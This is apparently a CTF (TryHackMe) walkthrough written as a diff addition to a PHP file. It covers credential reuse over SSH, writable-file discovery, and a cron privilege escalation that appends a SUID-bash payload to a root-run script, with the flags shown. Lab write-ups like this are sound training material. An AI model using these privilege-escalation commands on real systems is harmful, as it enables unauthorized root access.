@@ -256,5 +256,57 @@ function get_db() {
 }
 ?>
 
+The info provided here is a goldmine especially DB_PASS. Becasue ssh port 22 is open I can try to SSH Using the password 
+ssh devops@10.130.137.100
+Password: D3v0ps!2024
+
+After a moment 
+devops@tryhackme-2404:~$ whoami
+devops
+Now that I am logged into devops all I need to do is cat /opt/flag3.txt -> THM{rf1_2_rc3_f00th0ld_fl4g3}
+Flag 3 found!
+
+Sweet now that I am logged in task 4 asks me to find the flag in the home directory
+After moving over to the home directory I find a file called users.txt
+After opening the file I get -> THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
+Flag 4 found!
+
+The next objective is to find any files that are possible writable to 
+find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|run)' | head -40
+Two files stand out 
+/opt/admin_bot.py — writable, owned by root
+/opt/monitoring/health_report.sh — writable
+
+Before I triaged both paths I found that /opt/tools/pspy64 was available to run. By discoving this I was able to see the active processes and when they ran. 
+After looking at the data health_report.sh would fire at the top of every minute making this an excellent target for malicious code 
+UID=0  /bin/sh -c /opt/monitoring/health_report.sh
+
+Two facts combined to make this exploitable:
+
+UID=0 — root’s cron is executing the script, so every command inside the script runs with root’s privileges.
+-rwxrwxrwx — the script is world-writable, so you (devops, an unprivileged user) can change what’s inside it.
+
+Now here is the payload 
+echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/monitoring/health_report.sh
+Why this works: 
+
+cp /bin/bash /tmp/rootbash — copies the bash binary to a new file you own the location of. Here’s the key: 
+when root runs this, root creates the copy, so the copy is owned by root. A file’s owner is whoever creates it, and cron is running as root. 
+I now have a root-owned copy of bash sitting in /tmp.
+chmod 4755 /tmp/rootbash — this is the heart of it. That 4 in front of 755 is the SUID bit (Set User ID).
+755 = owner can read/write/execute, group and others can read/execute (standard).
+The leading 4 sets SUID.
+
+Once the health file was executed I checked to see if the rootbash file was created
+ls -la /tmp/rootbash
+-rwsr-xr-x 1 root root 1446024 Nov  5 21:18 /tmp/rootbash
+This result shows that the file was created succefully and the payload was effective 
+Running /tmp/rootbash -p drops us right off into root 
+
+rootbash-5.2# id 
+uid=1001(devops) gid=1001(devops) euid=0(root) groups=1001(devops)
+rootbash-5.2# cat /root/root.txt 
+THM{pr1v3sc_cr0n_r00t_fl4g5}
+Last flag found!
 
 
